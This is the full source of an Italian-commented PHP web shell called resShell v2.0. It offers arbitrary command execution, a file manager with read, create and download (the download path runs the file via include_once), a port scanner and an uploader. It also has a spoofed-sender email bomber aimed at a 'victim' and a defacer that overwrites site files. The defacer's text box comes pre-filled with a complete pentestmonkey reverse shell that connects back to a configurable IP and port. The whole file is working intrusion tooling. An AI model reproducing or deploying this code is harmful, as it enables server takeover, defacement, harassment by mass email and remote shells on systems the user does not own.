<html>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

	<title>..:ResearcherShell:..</title>

	<style type="text/css">
		body{
			background-color: grey
		}

		input{
			padding: 5px;
			border: 2px solid #555;
			border-radius: 3px
		}

		textarea{
			border: 3px solid #555;
			border-radius: 3px	
		}

		td{
			width: 100px;
		}

		pre{
			background-color: lightgrey
		}

		hr {
			margin-top: 0.5em;
			margin-bottom: 0.5em;
			margin-left: auto;
			margin-right: auto;
			border-style: inset;
			border-color: white;
		}	

		div{
			padding-top: 10px;
			padding-right: 10px;
			padding-bottom: 10px;
			padding-left: 10px;
		}

	</style>

	<hr>
</head>

<body>
	<div class="container" width="100%" >
		<ul class="breadcrumb">
			<li><a href="?page=about">About</a></li>
			<li><a href="?page=info">General Informations</a></li>
			<li><a href="?page=shell">Get Shell</a></li>
			<li><a href="?page=filemanager">File Manager XS</a></li>
			<li><a href="?page=portscanner">Port Scanner</a></li>
			<li><a href="?page=uploader">Uploader</a></li>
			<li><a href="?page=mail">Fake Mailer</a></li>
			<li><a href="?page=defacer">Defacer - Replacer</a></li>
		</ul> 
	</div>
	<hr>
</body>

</html>

<?php

$page = $_GET['page'];

if ( $page == 'about' ) { ####################################################################### home
	echo '<center><font size="5" color="green">resShell v2.0 #beta - coded by Animal-Heart</font></center>';

} elseif ( $page == 'info' ) { ####################################################################### Commands
	//informazioni del sito
	// variabili varie 
	$serverIP = $_SERVER['SERVER_ADDR'];
	$yourIP = $_SERVER['REMOTE_ADDR'];
	$UserA = $_SERVER['HTTP_USER_AGENT'];
	$path = $_SESSION['path'] = dirname(__FILE__);
	$shell = dirname(__FILE__);
	$ThisDIR = ".";

	echo "<div class='container'>";
	echo "<pre><h4>";
	echo "<b>Whoami > </b>", exec('whoami'), "<br>";
	echo "<b>Current User > </b>", get_current_user(), "<br>";
	echo "<b>Uname > </b>", php_uname('a'), "<br>";
	echo "<b>OS system > </b> ", PHP_OS, "<br>";
	echo "<b>Server IP > </b> $serverIP", "<br>";

	// prints e.g. 'Current PHP version: 4.1.1'
	echo "<b>PHP Version > </b>" . phpversion(), "<br>";
	echo '<hr align=left size=1 style="width:100%" color="blue" noshade>'; // barra blu
	
	echo "<b>Your IP > </b> $yourIP", "<br>";
	echo "<b>User agent > </b> $UserA", "<br>";
	echo "<b>You are here > </b>", $path, "<br>";
	echo "</h4></pre>";

	echo "</div>";
	//fine info	

} elseif ( $page == 'shell' ) { ####################################################################### Shell
	echo "<div class='container'>";
	echo '
	<form action="?page=shell" method="post">
		<input type="text" placeholder="cat /etc/passwd" NAME="cmd"/>
		<input name="submit" type="submit" value="Esegui">
	</form>
	'; // form html shell

	if(isset($_POST['cmd'])){
		echo '<pre>';
		system($_POST['cmd']);
		echo '</pre>';
	} 
	echo "</div>";

} elseif ( $page == 'filemanager' ) { ####################################################################### File Manager
	echo "<div class='container'>";
	echo '
	<form action="?page=filemanager" method="post">
		<input type="text" placeholder="/var/www/html" name="read"/>
		<input name="scandir" type="submit" value="DirScanner" />
		<input name="readfile" type="submit" value="FileReader" />
		<input name="filecreator" type="submit" value="FileCreator" />
		<input name="download" type=submit value="FileDownloader" />
	</form>'; // form html;  

	// mostro il contenuto della cartella
	if(isset($_POST['scandir'])) {
		echo "<pre>";

		$directory = $_POST['read']; // creo questa variabile per fare in modo che l'utente possa spostarsi in più cartelle
		
		if ($directory != '') {
		
		if (is_dir($directory)) {
			
			if ($handle = opendir($directory) or die ('<table><tr><td><b><font color="red">ERROR:</font> Impossibile aprire questa directory</b> <form action="" method="POST"></td></tr> <tr><td><input action="" type="submit" value="Back" /></form></td></table>')) {
				while (false !== ($entry = readdir($handle))) {
					if ($entry != "." && $entry != "..") {
						echo "$entry<br>";
					}
				}
				closedir($handle);
			}
		} else {
			echo "Directory non esistente!";
		}
	} else {
		echo 'Inserisci il percorso della directory, puoi inserire un punto "." per dichiarare la directory della resShell.';
	}

	} 


	// leggo il contenuto di un file
	if(isset($_POST['readfile'])) {
		$text = $_POST['read'];
		$content = file_get_contents($text);
		echo "<pre>File: <b>$text</b></pre>";
		echo "<pre>$content</pre>";
		}
		
	// creatore di file
	if(isset($_POST['filecreator'])) {
		$f_cre = $_POST['read'];

		if(!file_exists($f_cre)) {			
			if(!empty($f_cre)){
					fopen("$f_cre", "w+");
					echo "<pre><b>File:</b> $f_cre <b>creato!</b></pre>";
				} else {
					echo "<pre><b>Non hai specificato che file creare.</b></pre>";
				}
		} else {
			echo "<pre><b>File: </b>$f_cre <b>già esistente.</b></pre>";
		}
	}
		
	// downloader
	if(isset($_POST['download'])) {

	$file = $_POST['read']; // prendo quello che scrive l'utente e lo imposto in questa variabile

	// imposto gli headers per il download del file
	if (file_exists($file)) {
	    header('Content-Description: File Transfer');
	    header('Content-Type: application/octet-stream');
	    header('Content-Disposition: attachment; filename='.basename($file));
	    header('Content-Transfer-Encoding: binary');
	    header('Expires: 0');
	    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
	    header('Pragma: public');
	    header('Content-Length: ' . filesize($file));

	    include_once($file);
	    exit;
		} else {
			echo "<pre>Non esiste alcun file di nome: $file</pre>"; // stampo errore se il file non esiste
			}
	}
	echo "</pre>";
	echo "</div>";

} elseif ( $page == 'portscanner' ) { ####################################################################### Port Scanner
	echo "<div class='container'>";
	echo '
		<form method="post" >
			<input type="text" placeholder="site.com/IP" name="domain" /> 
			<input type="submit" value="Scan" />
		</form>'; // form html
		
	if(isset($_POST['domain'])) {
		echo "<pre>";

		if(!empty($_POST['domain'])) { 
			 
		    //lista delle porte 
		    $porte = array(21, 22, 23, 25, 53, 80, 110, 443, 445, 1433, 3306, 8080); // includo nell'array le porte 

		    $results = array();
		    foreach($porte as $porta) {
		        if($pf = @fsockopen($_POST['domain'], $porta, $err, $err_string, 1)) { // verifico se le porte sono aperte o chiuse usando la funzione socket
		            $results[$porta] = true;
		            fclose($pf);
		        } else {
		            $results[$porta] = false;
		        }
		    }

		    foreach($results as $porta=>$val) {
		        $protocollo = getservbyport($porta,"tcp"); // variabile che restituisce in valore il nome del servizio
		            echo "Porta $porta (<font color=blue>$protocollo</font>): ";
		        if($val) { // se il valore restituisce "TRUE" stampo se è aperta o chiusa
		            echo "<font color=green>Aperta</font><br>";
		        }
		        else {
		            echo "<font color=red>Chiusa</font><br>";
		        }
		    } 
		} else {
			echo "Inserisci un IP o Dominio";
		}
	}
	echo "</pre>";
	echo "</div>";

} elseif ( $page == 'uploader' ) { ####################################################################### Uploader 
	echo "<div class='container'>";
	echo '
		<form action="" method="post" enctype="multipart/form-data">  
			<input type="file" name="upload"> <br>
			<input type="submit" name="up" value="Upload"> 
		</form>'; 

	echo "<pre># ";
	// variabili 
	$cartella_upload ="."; // cartella di upload, ho messo il punto "." per far in modo che uppi i file nella cartella della resShell
	$nome_file = $_FILES["upload"]["name"]; // racchiudo il nome del file nella variabile
	$path = $_SESSION['path'] = dirname(__FILE__);
				  
	if(isset($_POST['up']) and isset($_FILES["upload"])) {     // verifico se il form è stato inviato
		if(trim($_FILES["upload"]["name"]) == '')  {  // verifico che l'utente abbia selezionato un file altrimenti stampo errore 
			echo '<b>Inserisci un file prima di uppare il nulla</b>';  // severo ma giusto
		}
		  	
		else if(file_exists($nome_file)) { 	// verifico se il file esiste già
				echo "<b>Il file</b> $nome_file <b>è già presente</b>";
			}

		else if(!is_uploaded_file($_FILES["upload"]["tmp_name"]) or $_FILES["upload"]["error"]>0)  {  // verificho che il file è stato caricato
				echo '<b>Si sono verificati problemi nella procedura di upload..</b>';  
			} 

		else if(!is_writable($cartella_upload))  {  // verifico che la cartella di destinazione abbia i permessi di scrittura, altrimenti stampo errore
				echo "<b>La cartella in cui fare l'upload non ha i permessi!</b>";  
			}  

		else if(!move_uploaded_file($_FILES["upload"]["tmp_name"], $_FILES["upload"]["name"]))  {  // verifico il successo della procedura di upload nella cartella settata  
				echo '<b>Qualcosa è andato storto nella procedura di upload.. </b>';  
			}  
			
		else  {  // se tutto è andato bene, riporto il percorso + il file appena uppato
				echo "<b>Uploaded! Il file si trova qui: ></b> $path/$nome_file";
				}
	}

	echo "</pre>";
	echo "</div>";

} elseif ( $page == 'mail' ) { ####################################################################### Fake Mailer
	echo '
	<form action="?page=mail" method="post">
		<div class="container">
		<table>
		<tr>
			<td><label for="nome">Email:</label></td> 
			<td><input type="text" placeholder="Email Vittima" name="email"></td> 

			<td><label for="nome">From:</label></td> 
			<td><input type="text" value="fake.email708@gmail.com" name="from"></td>
		</tr>

		<tr>
			<td><label for="nome">Soggetto:</label></td> 
			<td><input type="text" value="We Are ALF" name="subject" /></td> 
			<td><label for="nome">Spam:</label></td> <td><input type="text" value="100" name="spam"></td>
		</tr>

		<tr>
			<td><label for="nome">Messaggio:</label></td> 
			<td><TEXTAREA NAME="message" placeholder="Hi Dear :)" ROWS=2 COLS=50></TEXTAREA></td> 
			<td></td><td><input type="submit" value="Invia" /></td> <td><input type="reset" /></td>
		</tr>

		</table>
		</div>
	</form>
	'; // form html

	// variabili 
	$num = 1;
	$email = $_POST['email'];
	$spam = $_POST['spam'];
	$subject = $_POST['subject'];
	$message = $_POST['message'];
	$from = $_POST['from'];
	$send = $_POST['send'];

	if($spam==' ') // se la textarea è vuota, procedo ad inserire di default ilvalore 100000
	{
	  $spam = 100000;
	}


	if($spam!='' && $email=='') { // verifico se l'utente abbia inserito l'email vittima
		echo '<script>alert("Inserisci il mittente")</script>';
	}

	if($email != '') { // se $email è diverso dal vuoto, procedo con il ciclo di loop per lo spam email
		while($num<=$spam) { // avvio il ciclo di spam
			mail ($email, $subject, $message, "From: " . $from); // avvio la funzione "mail" con le variabili
			$num++;
		}  
	}
	echo "<hr>";

} elseif ( $page == 'defacer' ) { ####################################################################### Defacer
	echo '<div class="container">
		<table>
			<tr>
				<form method="post" action="?page=defacer">
					<h5>Nella textarea trovi la reverse shell di PENTESTMONKEY*</b></h5>
					<textarea name="sorgente" style="width:70%" rows="15">
<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = "127.0.0.1";  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = "uname -a; w; id; /bin/sh -i";
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists("pcntl_fork")) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Cant fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Cant setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Cant spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won"t
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process"s STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process"s STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process"s STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we"ve daemonised ourself
// (I can"t figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>			</textarea>
					<tr><td>
						<font size="2"<i>*Percorso del file</i>
						<br>
						<input type="text" placeholder="/cartella/del/server/" name="folder">
					</td>

					<td>
						<font size="2"<i>*Nome del file</i>
						<br>
						<input type="text" placeholder="index.html" name="rew">
					</td></tr>

					<hr>

					<tr><td> 
						<br>
						<input type="submit" name="submit" value="Deface - Replace">
					</td>

					<td>
						<br>
						<input type="reset">
					</td></tr>

				</form>
			</tr>
		</table>
	</div>'; // form html più source revershell

	if(isset($_POST['submit']) === true) { // Controllo che il form sia stato inviato
		// variabili 
		$pages = $_POST['rew'];
		$folder = $_POST['folder'];
		
		$files = glob("$cartella_upload/$pages"); // Riscrivo i/un file nella cartella della webshell
		$files2 = glob("$folder/$pages"); // Riscrivo i/un file dove vuole l'utente

	foreach($files as $file) {	// defacer, per ogni file, sostituisco il source di ognuno con quello inserito dall'utente
		$file = fopen("$file", 'w+'); // apro il file rimuovendo tutto quello che è presente al suo interno
		fwrite($file , $_POST['sorgente']); // scrivo dentro il file quello che vuole l'utente
		fclose($file); //  chiudo il file
		}

	/*IDEM COME SOPRA*/
	foreach($files2 as $file) {	
		$file = fopen("$file", 'w+');
		fwrite($file , $_POST['sorgente']); 
		fclose($file);
		}
	}

}

// http://yoursite.com/index.php?page=one
// Outputs 'This is page one!'
?>
